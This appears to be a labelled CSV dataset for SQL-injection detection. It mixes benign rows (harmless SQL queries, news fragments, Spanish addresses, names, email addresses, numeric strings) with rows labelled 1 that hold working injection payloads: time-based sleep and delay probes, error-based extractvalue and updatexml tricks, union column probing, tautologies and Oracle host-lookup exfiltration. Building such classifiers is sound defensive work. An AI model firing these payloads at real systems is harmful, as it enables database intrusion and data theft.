Query,Label
chinarro,0
"1' )  where 5883 = 5883 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"He Kerr still love , emphasised 36-year-old",0
"c/ madre castisima, s/n",0
46813,0
60586849l,0
"select pg_sleep ( 5 )  and   (  (  ""byhx"" like ""byhx",1
SELECT again ( s )  FROM sets LEFT JOIN,0
"select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1",1
"SELECT OrderID, Quantity, IF ( Quantity>10, ""MORE"", ""LESS"" )  FROM  OrderDetails;",0
"SELECT * FROM space WHERE radio NOT IN  ( 'take', 'railroad', 'offer' )",0
"1""  )  )   as tngu where 3644 = 3644 union all select null--",1
One 20 children United States food allergies,0
Nor matter gauge try him,0
holgachona,0
SELECT forty ( s )  FROM grow,0
6448,0
"1%'  )  )   )  union all select null,null,null,null#",1
93sci06i745o,0
"select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
&quot; His addiction cocaine left hopelessly compromised vulnerable motives leading members organised crime groups tasked obtain valuable information regarding police investigations,0
coursdev,0
"1%"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,1
hofmeist0,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )  # idxq",1
lautaro,0
1 )  as zmxb where 8424 = 8424 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1
"In 2008 , Schleeh carpentry company Baiersbronn built hospital station Socogim , poor district edge Capital , record time less one week - free charge",0
"At time tourist aspect , environmental aspects also taken consideration",0
25109956m,0
49515,0
SELECT COUNT ( DISTINCT serve )  FROM completely,0
almadrones,0
"select * from generate_series ( 1134,1134,case when  ( 1134 = 4909 )  then 1 else 0 end )  limit 1--",1
SELECT cool FROM repeat UNION SELECT become FROM married ORDER BY visit,0
SELECT Count ( * )  AS include,0
d0l1tativ8,0
c/ calzada 169,0
"1'+ ( select 'bztp' where 2541 = 2541 union all select null,null,null,null,null,null,null,null,null,null--",1
suyay,0
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )",1
"1  )  )   as rqbo where 2243 = 2243 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
env+olvente,0
SELECT COUNT ( rabbitID ) FROM forth,0
lilah,0
"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
-1499 )  as gxfm where 9762 = 9762 or 5989 = 4782--,1
1'  )  )   )  rlike sleep ( 5 ) #,1
SELECT * FROM wild WHERE NOT sleep = 'halfway'  AND NOT union = 'create',0
SELECT consonant FROM numeral UNION ALL SELECT least FROM particular ORDER BY funny,0
SELECT * FROM belong WHERE lucky BETWEEN 'second' AND 'gone',0
"But &apos;t seen law play , speculate",0
"1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( 'sqni' like 'sqni",1
12191,0
"1"" )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
1%' )  and 4595 = 4595#,1
6819240000000000,0
SELECT * FROM income WHERE chapter = 'distant'  AND City = 'pleasant',0
"1%'  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  '%' = '",1
valdehorna,0
arenillas de riopisuerga,0
Co-operation like-minded countries easier non-federal Europe Nations,0
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
Kenyan lawmakers target public anger past,0
"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",1
I &apos;ve realised wrongdoing,0
SELECT * FROM foot FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM wonderful WHERE warn = 'health' LIMIT 3,0
divinizacin,0
macdougall_laurier@rocofer.am,0
"Other places hoping sell concept wary public devices , less",0
SELECT * FROM friendly WHERE possibly = 'interest' FETCH FIRST 3 ROWS ONLY,0
"-2319 union all select 5068,5068,5068#",1
197,0
manferidor,0
1'   )    )    as qqvk where 1007  =  1007,1
"1""  )  )   waitfor delay '0:0:5'--",1
The police inspector responsible time invited witness,0
"calle diamante, 57",0
"The eye placed one ray fall, might testify particular ray",0
"-7743"" or 9323 = 9323#",1
SELECT * FROM please WHERE wind BETWEEN 'printed' AND 'previous',0
oke,0
"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1
"1"" )  as fkco where 8877 = 8877 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
SELECT boat ( s ) FROM tribe INNER JOIN,0
30840,0
DELETE FROM pan WHERE halfway = 'range',0
lana,0
"pl. limeo 22, 5?e",0
"cuesta pizarro 12, 4?d",0
select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,1
"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-3279"" union all select 8568,8568,8568,8568--",1
78695182s,0
"Further attractions Sunday corn maze , craft market sheep shearing",0
gallinero de cameros,0
1  )   where 1487  =  1487,1
6884926189160284,0
milad,0
"-2230%"" union all select 3303,3303,3303--",1
"1 )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
lim@marketingmunicipal.bf,0
1'+ ( select taga where 8036 = 8036,1
*  (  |  (  mail  =  *   )    ),1
"SELECT per, bet+ ', ' + setting+ ' ' + leader+ ', ' + practice AS blew  FROM breathing",0
swaden,0
4347901737228358,0
"Indeed , demand across parts southeast Asia - household debt rising - ValueMax , carrying transaction , week became third pawnshop list Singapore stock exchange",0
"In United States , average age 12",0
albuminmetro,0
"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,1
"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM sitting FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wing,0
"The police completely blocked road immediately , initially could make much comment cause accident",0
"select * from generate_series ( 7724,7724,case when  ( 7724 = 8170 )  then 1 else 0 end )  limit 1--",1
en2re7e4hu16,0
"Last month , people close situation said RBS turned records emails instant messages UK regulator , Financial Conduct Authority , sent former trader",0
"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
3074022895871752,0
onofredo,0
"-5548' where 4477 = 4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",1
SELECT * FROM organized WHERE trunk  BETWEEN 10 AND 20,0
"-8684 union all select 9519,9519,9519,9519--",1
"1"" or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and ""pwwb"" like ""pwwb",1
entresurco,0
elder@parcalia.hn,0
diana,0
4898771590601702,0
daimiel,0
puntagorda,0
judas,0
4830,0
"From fascinating view world-famous skyline , particularly impressive evening light",0
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,1
"Drew Bowler , managing director Bowler Motorsport , said: &quot; Rally customers coming Bowler changed",0
mao,0
9224,0
"1%' )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( '%' = '",1
91800426c,0
"1 )  where 9012 = 9012 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"It &apos;s hard remember days optimism -- seem distant memory , sad reminder opportunities gone",0
select  ( case when  ( 9732 = 7136 )  then 9732 else 9732* ( select 9732 from information_schema.character_sets )  end ) #,1
"select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1
adelmar,0
"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",1
peaflor de hornija,0
"Bombardier , world &apos;s largest trainmaker , said revenue division rose nearly 11 percent $ 2",0
25265,0
juneho,0
37711,0
SELECT * FROM radio ORDER BY anyway DESC,0
"-6368  )  )   union all select 4646,4646,4646,4646,4646,4646,4646--",1
"SELECT * FROM having ORDER BY firm, dry",0
"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",1
That &quot; Blade Runner &quot; problem,0
lloret de mar,0
"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",1
finney,0
ac6di9o,0
5854367786451207,0
pettinge,0
"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",1
rupit i pruit,0
apolilladura,0
7144710000000000,0
-2992%'  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( '%' = ',1
87356578w,0
8l077ra,0
1   )    )    union all select null--,1
Beyond current budget currency problems lies deeper European productivity malaise,0
"The 45-year-old found guilty mass murder attack two nightclubs popular tourist area Kuta left 202 people dead , including 88 Australians , injured scores",0
shubaly,0
"-6618""   )    )     )   order by 1#",1
or 0 = 0 #,1
"SELECT * FROM with WHERE paragraph IN  ( 'explanation', 'couple', 'nor' )",0
9728,0
micaas,0
"However , committee recommended FAA allow pilots order passengers shut devices instrument landings low visibility",0
hinojal,0
05145,0
9.47299E+015,0
felli,0
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",1
"1'+  (  select 'yzxc' where 5230  =  5230   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1
SELECT * FROM fallen  WHERE leg = ought,0
"1"" where 7045  =  7045",1
"camino de leganes, 13",0
SELECT TOP 3 * FROM popular WHERE blow = 'scared',0
Vienna Airport abolishes passenger call-outs Mr,0
select  ( case when  ( 3325 = 1767 )  then 3325 else 3325* ( select 3325 from mysql.db )  end ) #,1
7150,0
neugebauer@buscamoto.gw,0
"1"" where 3740 = 3740 rlike sleep ( 5 ) #",1
desc,1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ),1
medianero,0
SELECT AVG ( Price ) FROM our,0
SELECT * FROM double WHERE apartment = 'invented',0
cog6aticio,0
SELECT * FROM individual WHERE blind BETWEEN '1996-07-01' AND '1996-07-31',0
69441548v,0
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )",1
"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",1
SELECT * FROM joined WHERE essential NOT BETWEEN 'pole' AND 'support',0
522lta,0
"-9630%"" union all select 8592,8592,8592,8592--",1
broto,0
SELECT MIN ( weather )  AS rear FROM discuss,0
1343797430011078,0
1073,0
21890,0
 or 3  =  3 --,1
canute,0
"c/ boabdil, 91",0
9.31575E+015,0
1  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  5281 = 5281,1
1' )  as hqaq where 6411 = 6411 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
"-4686"" )  as dxks where 7123 = 7123 or elt ( 1032 = 1032,3623 ) --",1
"SELECT Employees.highest, COUNT ( Orders.gentlyID )  AS slightlyFROM    ( OrdersINNER JOIN indeed ON Orders.seenID  =  Employees.grassID )",0
She compared several German sayings corresponding Bible verses explained meaning,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( ""khuw"" like ""khuw",1
"1'  )  )   as gqzy where 2312 = 2312 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and 'gkku' like 'gkku",1
1' where 1770 = 1770,1
"As part anniversary celebrations , number events planned Geisingen Kirchen-Hausen",0
SELECT AVG ( climb ) FROM lovely,0
"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """,1
"1"" where 4066 = 4066 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1
"SELECT supply AS prepare, layers AS [line]  FROM belt",0
watanabe,0
e5670cij3,0
cuerva,0
Georges Bwelle one top 10 CNN Heroes 2013,0
v2e2udo,0
"avinguda guix borrull 170,",0
"SELECT strike, neck+ ', ' + thousand+ ' ' + medicine+ ', ' + arrive AS start  FROM experiment",0
"1'  )   and elt  (  7554  =  6257,6257  )   and   (  'bpzm'  =  'bpzm",1
"1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
svstica,0
SELECT * FROM car WHERE naturally = 'plane' LIMIT 3,0
end and    (    (   'vkle'  =  'vkle,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  5432  =  5432",1
"When year comes end eight weeks , anniversary year upon us",0
"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"waitfor delay '0:0:5' and   (  (   ( ""%"" = """,1
SELECT COUNT ( flies ) FROM gate,0
45634,0
8ro4,0
i-ching,0
"1'  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  'ygfv' = 'ygfv",1
SELECT * FROM riding WHERE firm = 'feet'  OR recall = 'may',0
-4082  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  7874 = 7874,1
cenicientos,0
"The host old games , wheelbarrow racing walking stilts , promises plenty fun",0
cuenca,0
03043033h,0
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1
"Most &apos;t touched carry-on bag fees , though",0
morrin,0
It also shows business expects renegotiation make significant shift current balance power back towards UK,0
"1 where 3737 = 3737 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
6460,0
"1'  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'kqqf' = 'kqqf",1
"1'+ ( select 'mgrj' where 8514 = 8514 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  +'",1
exec ( @s ),1
"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",1
The system creates threat fighting,0
-2781   )    )     )   or 2573  =  5848--,1
select  ( case when  ( 5009 = 1133 )  then 5009 else 5009* ( select 5009 from information_schema.character_sets )  end ) #,1
valladolid,0
hinwood-laretei@addl.es,0
0esino1o,0
"And: &apos; Without sound knowledge local language , even become lonely living dolce vita , &apos; added author , providing food thought seeking move abroad",0
90,0
"1"" )  where 9861 = 9861",1
comba,0
SELECT COUNT ( team )  FROM expect,0
"SELECT * FROM primitive WHERE coming IN  ( 'either', 'draw', 'queen' )",0
farid,0
4859430000000000,0
chaney2@adondeir.ng,0
"SELECT thrown,buy FROM already WHERE disappear = 'orange' UNION SELECT hot, goose FROM men",0
1%'  )  )   )  waitfor delay '0:0:5'--,1
"SELECT twentyID AS ID, me AS excited FROM wife",0
"-9737""   )    )     )   order by 1--",1
waitfor delay '0:0:5' and   (  (  7619 = 7619,1
SELECT * FROM sudden ORDER BY useful,0
amalie,0
"-7876%' )  union all select 3909,3909,3909,3909,3909#",1
1' rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  ),1
"En route , mail pass number servers Internet",0
"""a"""" or 3 = 3--""",1
5639,0
SELECT * FROM probably WHERE more LIKE '%desert%',0
SELECT AVG ( public ) FROM to,0
0,0
toribio,0
3471,0
68101168p,0
"SELECT * FROM directly ORDER BY river ASC, return DESC",0
55341505d,0
"SELECT * FROM nobody WHERE vertical IN  ( 'neighborhood', 'spent', 'opportunity' )",0
"Mainz already without injured key players Niki Zimling , Julian Baumgartlinger Niko Bungert",0
c632i6ela,0
brock,0
SELECT AVG ( pattern ) FROM pink SELECT SUM ( soon ),0
"1""  )   where 4172  =  4172 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
-6680' )  or 5483 = 3031 and  ( 'zxes' = 'zxes,1
"c/ ortiz de zuiga, 8,",0
or 'whatever' in  ( 'whatever' ),1
Let case serve warning criminals one beyond reach law,0
-3821' )  or 9323 = 9323#,1
7215089345042859,0
9201759661755850,0
"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",1
SELECT * FROM tape,0
Martin told CNN asked Daley whether then-boss knew potential shuffle,0
01498780p,0
FROM  ( SELECT DISTINCT fellow FROM recent ),0
x' OR full_name LIKE '%Bob%,1
3ube3a,0
"SELECT powder AS rate, automobile AS [men]  FROM chose",0
04087524x,0
calle fermin salvochea 155,0
cutler.hutton@the-white-pearl-resort.int,0
"-7749"" or   (  2689  =  7481  )  *7481",1
50790,0
"SELECT range,nuts,individual,hospital,present     (  (  continent JOIN move ON beat.grass =  weak.hungry )   INNER JOIN accidentON Orders.current =  chest.trafficID )",0
james,0
almacelles,0
"1"" )  as ubva where 6369 = 6369 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
", running hospital first , first",0
paracuellos de jarama,0
SELECT * FROM ruler WHERE shells  BETWEEN 10 AND 20,0
"When rebels , experiences extreme cruelty hands wantonly sadistic Mother Superior becomes object erotic fascination another",0
polvo,0
nickie,0
1'  )  )   )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( 'bwka' = 'bwka,1
"SELECT book,wool,available,middle,lesson     (  (  money JOIN composition ON refused.scientific =  wherever.onto )   INNER JOIN baseballON Orders.mainly =  took.indicateID )",0
"1"" )  where 1001 = 1001 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
SELECT * FROM fill  WHERE meat = rock,0
suspen3edo7,0
1' and  ( 3423 = 7789 ) *7789 and 'pdia' like 'pdia,1
"-1606'|| ( select 'qbaa' where 3967 = 3967 union all select 3967,3967,3967,3967,3967--",1
2095,0
SELECT * FROM bush WHERE five NOT LIKE 'bite%',0
Horseshoes thrown onto peg distance eight metres,0
DELETE FROM cloud WHERE young = 'country',0
SELECT cat FROM women,0
lundigan@3horas.gob,0
Patek may yet appeal sentence,0
7974,0
select  ( case when  ( 4111 = 1992 )  then 4111 else 1/ ( select 0 )  end ) --,1
komarov@docerosas.dk,0
"-3370' in boolean mode )  union all select 3432,3432,3432,3432#",1
(  select top 1,1
yardy,0
It also allows passengers choose seat advance buy directly Frontier website,0
"1%"" )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( ""%"" = """,1
"1   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   8554  =  8554",1
1 )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
"SELECT battle, pass+ ', ' + include+ ' ' + information+ ', ' + slowly AS this  FROM live",0
SELECT worry ( s FROM balloon RIGHT JOIN,0
"&quot; There lot tears year , &quot; Ms Corteen said",0
14230,0
edilnerto,0
zaleska_legon@zampy.so,0
aleandro-hayman@tecnoindomo.nr,0
96,0
SELECT * FROM win ORDER BY advice,0
apoderado,0
SELECT MIN ( good )  AS rhythm FROM sentence,0
1'  )  )   as dago where 9788 = 9788,1
"1  )  )   )  union all select null,null,null,null,null,null--",1
rosa,0
"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
02215,0
3192907631401763,0
whit,0
"-5300' union all select 2750,2750,2750,2750,2750,2750--",1
"Chris says ice cream lights reacts heat mouth means lick , brighter becomes",0
"-9166"" )  as hlre where 4768 = 4768 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
"1' )  where 9454 = 9454 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
lonnie,0
7231,0
81012741w,0
"-4527' union all select 7115,7115#",1
SELECT * FROM change WHERE five = 'lungs' FETCH FIRST 3 ROWS ONLY,0
08880,0
"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",1
6054,0
for26same8te,0
"There mortifying experience particular, fail wreak also general history; I mean “the foolish face praise,” forced smile put company feel ease answer conversation interest us",0
"1'+ ( select 'sppw' where 1677 = 1677 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'",1
"Obviously knows second , surveillance , must",0
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",1
n,1
gloriano,0
coria,0
"waitfor delay '0:0:5' and  ( ""ludp"" like ""ludp",1
"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",1
loudiadi,0
"1 )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 9509 = 9509",1
arraigadura,0
aguglia.vaughn@20horas.cc,0
1'   )    )    as pgif where 6346  =  6346,1
ja34ico,0
caaveruelas,0
kjer@multibuscador.com.ph,0
egner,0
"1'  )   as ccee where 8880  =  8880 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1"" )  where 8702 = 8702 union all select null,null,null,null,null--",1
"select sleep ( 5 )  and   (  (  ""%"" = """,1
"On Saturday 7 September , Highland Games start 1: 30 p",0
sripatimakul@forohh.ic,0
"c/ granada 40, 1?g",0
1  )  )   or sleep ( __TIME__ ) #,1
oropelero,0
"select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",1
en7repa2ecerse,0
SELECT * FROM newspaper WHERE made NOT LIKE 'common%',0
"1' )  where 9006 = 9006 union all select null,null,null,null,null,null--",1
"As result , revolt brewing , especially France , EU &apos;s main cheerleader",0
SELECT * FROM struggle  WHERE tea = forest,0
m,0
de6211gami5970,0
1'+ ( select rhlb where 9477 = 9477,1
57757963h,0
1 )  as rlft where 1670 = 1670 waitfor delay '0:0:5'--,1
sant jaume dels domenys,0
6120,0
"SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION",0
23291292c,0
begur,0
pelamen,0
"&quot; The Secretary State also admitted &apos;d guilty , along Barack Obama , &quot; automatic pilot &quot; incendiary revelations whistleblower Edward Snowden NSA &apos;s spying activities emerged",0
fac2ora,0
(  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ),1
"calle gola de perellonet, 196,",0
"select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
36680,0
SELECT * FROM engineer FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM goes,0
moldero,0
"select * from users where id = 1 union select 1||1,version (  )  -- 1",1
"select pg_sleep ( 5 )  and ""ilyw"" like ""ilyw",1
"SELECT plates, factor+ ', ' + won+ ' ' + bush+ ', ' + drive AS would  FROM central",0
1' )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  ),1
The objective create clear view viewpoint,0
There lot criticise,0
"It &apos;s unclear , however , whether Obama knew team exploring swap",0
charlebois3@nanotecnologo.np,0
SELECT TOP 3 * FROM simple WHERE especially = 'frame' SELECT * FROM kind,0
The new season Falkenberg &quot; Blue Velvet &quot; club begun,0
se0am536e,0
7548043709154269,0
yee,0
42193,0
Click image gallery performance &quot; singing mountain wave &quot;,0
"Frontier Airlines plans start charging $ 100 carry-on bag $ 2 coffee soda , although announcement Wednesday say passengers get keep whole",0
